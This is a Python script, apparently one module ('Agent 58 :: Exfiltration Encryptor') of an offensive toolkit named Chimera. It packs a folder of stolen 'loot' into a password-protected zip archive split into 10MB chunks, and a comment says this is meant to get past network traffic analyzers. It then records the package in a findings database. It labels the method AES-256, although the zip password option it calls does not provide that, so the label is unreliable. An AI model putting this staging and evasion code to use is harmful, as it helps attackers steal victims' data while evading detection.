import os
import sys
import subprocess

sys.path.append('/home/dan/Chimera_Project')
from core.db_handler import ChimeraDB

def run():
    db = ChimeraDB()
    os.system('clear')
    print("\033[34m" + "="*60)
    print("   CHIMERA AGENT 58 :: EXFILTRATION ENCRYPTOR")
    print("="*60 + "\033[0m")

    # Ensuring we point to your actual loot directory
    loot_folder = "/home/dan/Chimera_Project/loot"
    output_base = "/home/dan/Chimera_Project/outbound/chimera_exfil"
    
    if not os.path.exists("/home/dan/Chimera_Project/outbound"):
        os.makedirs("/home/dan/Chimera_Project/outbound")

    print(f"[*] Compressing and Encrypting loot from {loot_folder}...")

    try:
        # Using 'zip' with a password (-P) and splitting into 10MB chunks (-s 10m)
        # This bypasses most basic Network Traffic Analyzers looking for large files.
        cmd = f"zip -reP chimera_alpha_9 -s 10m {output_base}.zip {loot_folder}/*"
        subprocess.run(cmd, shell=True, check=True)
        
        print("\033[92m[+] SUCCESS: Loot encrypted and chunked in /outbound/\033[0m")
        db.report_finding("58_Exfiltration_Encryptor", "Exfil_Package_Created", {
            "method": "AES-256_Split_Zip",
            "location": output_base
        })
    except Exception as e:
        print(f"\033[91m[!] Exfil Prep Failed: {e}\033[0m")

    db.close()

if __name__ == "__main__":
    run()
